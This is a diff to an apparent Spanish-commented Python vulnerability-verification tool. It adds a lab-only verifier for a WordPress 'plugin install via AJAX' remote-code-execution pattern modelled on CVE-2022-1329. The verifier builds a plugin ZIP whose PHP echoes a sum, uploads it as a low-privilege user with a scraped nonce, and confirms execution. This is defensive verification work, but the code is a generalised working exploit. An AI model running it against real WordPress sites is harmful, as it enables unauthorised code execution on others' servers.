@@ -43,6 +43,7 @@ import subprocess
 import tarfile
 import time
 import urllib.parse
+import zipfile
 from dataclasses import dataclass, field
 from typing import Callable, List, Optional
 
@@ -594,14 +595,19 @@ class _Lab:
         ip = (r.stdout or "").strip()
         return ip or None
 
-    def find_in_webroot(self, token: str, timeout: float = 10.0) -> Optional[str]:
+    def find_in_webroot(self, token: str, timeout: float = 10.0,
+                        base_dir: str = "wp-content/uploads") -> Optional[str]:
         """Busca, DENTRO del propio contenedor Apache, la ruta REAL de un fichero cuyo nombre
-        contenga `token` bajo wp-content/uploads -- usado para file-upload, donde WordPress puede
-        renombrar/sanear el nombre subido, asi que la ruta publica no se puede adivinar por
-        convencion, hay que preguntarle al propio filesystem. `token` es siempre un token nuestro
+        contenga `token` bajo `base_dir` (relativo a /var/www/html; por defecto wp-content/uploads,
+        el caso de file-upload directo) -- usado donde WordPress puede renombrar/sanear el nombre
+        subido o colocarlo en un directorio que depende del slug, asi que la ruta publica no se
+        puede adivinar por convencion, hay que preguntarle al propio filesystem. Un verificador de
+        instalacion de plugin/tema (Plugin_Upgrader->install()) pasa base_dir='wp-content/plugins'
+        en vez de uploads, mismo mecanismo, distinta raiz. `token` es siempre un token nuestro
         (hex, de _token()), nunca entrada de la hipotesis -- no hay inyeccion de shell posible."""
+        root = f"/var/www/html/{base_dir.strip('/')}"
         r = self.sh("exec", self.wp, "sh", "-c",
-                   f"find /var/www/html/wp-content/uploads -iname '*{token}*' -type f "
+                   f"find {root} -iname '*{token}*' -type f "
                    f"2>/dev/null | head -1", timeout=timeout)
         p = (r.stdout or "").strip()
         return p or None
@@ -3660,6 +3666,175 @@ def verify_wordpress_file_upload(
                           f"como PHP -- el file-upload no se confirmo (puede que valide de "
                           f"verdad la extension/el tipo MIME/el contenido, o el campo/endpoint no "
                           f"sean los reales)")
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
+
+
+def _build_minimal_plugin_zip(token: str, expected_sum_a: int, expected_sum_b: int) -> bytes:
+    """Construye, EN MEMORIA, un ZIP de plugin de WordPress minimo pero valido: una carpeta
+    <slug>/ con un unico fichero <slug>.php que lleva la cabecera de plugin que WordPress exige
+    para reconocerlo como tal (comentario '/* Plugin Name: ... */' al principio del fichero
+    principal, mismo nombre que la carpeta) y, como cuerpo, un calculo de suma -- la misma prueba
+    dura que verify_wordpress_file_upload: si la respuesta trae la suma CALCULADA y no el codigo
+    fuente, es que el intérprete PHP lo ejecuto de verdad, no que el ZIP solo se desempaqueto."""
+    slug = f"binoracle_shell_{token}"
+    php = (
+        f"<?php\n"
+        f"/*\n"
+        f"Plugin Name: binoracle test {token}\n"
+        f"Description: minimal plugin used only to prove Plugin_Upgrader->install() RCE\n"
+        f"Version: 1.0\n"
+        f"*/\n"
+        f"echo {expected_sum_a}+{expected_sum_b};\n"
+    ).encode()
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr(f"{slug}/{slug}.php", php)
+    return buf.getvalue()
+
+
+def verify_wordpress_plugin_install_rce(
+    plugin_source_dir: str, slug: str, ajax_action: str,
+    file_param_hint: str = "fileToUpload", nonce_param_hint: str = "_nonce",
+    extra_params: Optional[dict] = None,
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+    companion_plugins: Optional[list] = None,
+    extra_nonce_pages: Optional[list] = None,
+    extra_setup_trigger_paths: Optional[list] = None,
+    shortcode_name: Optional[str] = None,
+    keep_lab_on_failure: bool = False,
+) -> WpVerifyResult:
+    """Verifica el patron de RCE 'instalacion de plugin via AJAX' -- distinto del upload directo
+    que verify_wordpress_file_upload cubre (un .php/.phtml/polyglot subido directamente al
+    webroot): aqui el sumidero real es WordPress_Upgrader/Plugin_Upgrader->install(), que ESPERA
+    un ZIP de plugin valido (no un .php suelto) y lo desempaqueta bajo wp-content/plugins/<slug>/.
+    Patron confirmado en vivo contra CVE-2022-1329 (Elementor <=3.6.2, core/app/modules/onboarding/
+    module.php): un handler AJAX registrado en admin_init que solo comprueba el nonce
+    (wp_verify_nonce) sin ningun chequeo de capability, asi que cualquier usuario autenticado de
+    bajo privilegio (Subscriber) puede llamarlo -- este verificador generaliza ese patron a
+    cualquier plugin/handler con la misma forma (accion AJAX + nonce + campo de fichero que acaba
+    en Plugin_Upgrader/unzip_file), no solo Elementor.
+
+    Dos pasos, cada uno con prueba dura:
+    1) construye un ZIP de plugin minimo real (ver _build_minimal_plugin_zip) cuyo PHP calcula
+       a+b, y lo sube via POST multipart a /wp-admin/admin-ajax.php con action=`ajax_action` y el
+       nonce resuelto de verdad (scraping de paginas reales del sitio via _auto_resolve_wp_blockers
+       -- el mismo mecanismo generalizado a los 13 verificadores, aqui aplicado al nonce de un
+       endpoint AJAX en vez de a un formulario).
+    2) en vez de adivinar la ruta publica del plugin instalado, pregunta DIRECTAMENTE al
+       filesystem del contenedor (find_in_webroot con base_dir='wp-content/plugins') por un
+       fichero cuyo nombre contenga el token unico de este intento, construye su URL publica real,
+       y la pide: si la respuesta trae la suma CALCULADA (no el codigo fuente), el ZIP se
+       instalo Y el PHP dentro se ejecuta -- RCE confirmada, no solo 'el ZIP se acepto'."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    lab = _Lab(_token())
+    boot = None
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
+                              companion_plugins=companion_plugins,
+                              extra_setup_trigger_paths=extra_setup_trigger_paths,
+                              shortcode_name=shortcode_name)
+        if boot is None:
+            return res
+
+        endpoint = "/wp-admin/admin-ajax.php"
+        base_params = {"action": ajax_action, nonce_param_hint: ""}
+        base_params.update(extra_params or {})
+        endpoint, base_params = _auto_resolve_wp_blockers(
+            boot, lab, slug, "POST", endpoint, base_params, file_param_hint, res, step,
+            extra_nonce_pages=extra_nonce_pages)
+        if not base_params.get(nonce_param_hint):
+            res.detail = (f"no se pudo raspar un nonce real para la accion AJAX '{ajax_action}' "
+                          f"de ninguna pagina del sitio -- sin nonce la peticion falla siempre "
+                          f"(wp_verify_nonce), con o sin bug real detras")
+            res.evidence["screenshots"] = boot.shots
+            return res
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "ajax_action": ajax_action, "nonce_param": nonce_param_hint, "endpoint": endpoint,
+        })
+
+        token = _token()
+        a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
+        expected = a + b
+        zip_bytes = _build_minimal_plugin_zip(token, a, b)
+        step(f"subiendo un ZIP de plugin minimo ('binoracle_shell_{token}') via accion AJAX "
+             f"'{ajax_action}' (campo {file_param_hint}, contenido PHP que calcula {a}+{b})...")
+        other_params = {k: v for k, v in base_params.items() if k != file_param_hint}
+        try:
+            resp = boot.sub_sess.post(
+                boot.base_url + endpoint, data=other_params,
+                files={file_param_hint: (f"binoracle_shell_{token}.zip", zip_bytes,
+                                         "application/zip")},
+                timeout=30)
+        except Exception as e:
+            res.detail = f"error de red subiendo el ZIP: {e}"
+            res.evidence["screenshots"] = boot.shots
+            return res
+        res.evidence["status_subida"] = resp.status_code
+        res.evidence["respuesta_subida_recorte"] = (resp.text or "")[:500]
+
+        found_path = lab.find_in_webroot(token, base_dir="wp-content/plugins")
+        if not found_path:
+            res.ok = True
+            res.detail = (f"el ZIP se posteo a '{endpoint}' (action={ajax_action}, nonce real "
+                          f"resuelto) pero ningun fichero con el token aparecio bajo "
+                          f"wp-content/plugins -- Plugin_Upgrader->install() no lo acepto "
+                          f"(capability real, validacion del ZIP, o el handler/accion no son los "
+                          f"reales), no se confirma RCE")
+            res.evidence["screenshots"] = boot.shots
+            return res
+        rel = found_path.replace("/var/www/html", "", 1)
+        candidate_url = boot.base_url + rel
+        step(f"ZIP instalado en {found_path}; pidiendolo directo para ver si el PHP se EJECUTA...")
+        try:
+            r2 = boot.sub_sess.get(candidate_url, timeout=15)
+        except Exception as e:
+            res.detail = f"ZIP instalado en {found_path} pero error de red al pedirlo: {e}"
+            res.evidence["screenshots"] = boot.shots
+            return res
+        pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
+        executed = bool(pattern.search(r2.text or ""))
+        res.evidence.update({
+            "ruta_instalada": found_path, "url_publica": candidate_url,
+            "status_code_respuesta": r2.status_code, "suma_esperada": expected,
+            "suma_presente": executed, "respuesta_cuerpo_recorte": (r2.text or "")[:500],
+        })
+        res.ok = True
+        if executed:
+            res.verified = True
+            res.detail = (f"RCE confirmada: el ZIP subido via la accion AJAX '{ajax_action}' se "
+                          f"instalo como plugin real bajo {found_path} y, al pedirlo, el servidor "
+                          f"EJECUTO su PHP (devolvio {expected}={a}+{b}, calculado por el "
+                          f"interprete) -- cualquier usuario autenticado de bajo privilegio con "
+                          f"el nonce correcto puede instalar codigo arbitrario")
+            step(f"VERIFICADO: {candidate_url} devolvio {expected} (={a}+{b}) -- RCE via "
+                 f"Plugin_Upgrader->install().")
+            step("capturando pantalla: el plugin instalado ejecutandose de verdad (prueba final)...")
+            boot.capture(boot.sub_sess, rel,
+                   f"Paso 5: RCE confirmado -- el ZIP de plugin se instalo via la accion AJAX "
+                   f"'{ajax_action}' y SE EJECUTA como PHP (devuelve {expected}={a}+{b}).",
+                   f"Step 5: RCE confirmed -- the plugin ZIP was installed via the AJAX action "
+                   f"'{ajax_action}' and RUNS as PHP (returns {expected}={a}+{b}).")
+        else:
+            res.detail = (f"el ZIP se instalo bajo {found_path} pero pedir "
+                          f"{candidate_url} no devolvio la suma calculada -- se guardo pero no se "
+                          f"confirma que el PHP se ejecute (puede que WordPress bloquee la "
+                          f"ejecucion de PHP en wp-content/plugins por configuracion del servidor)")
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
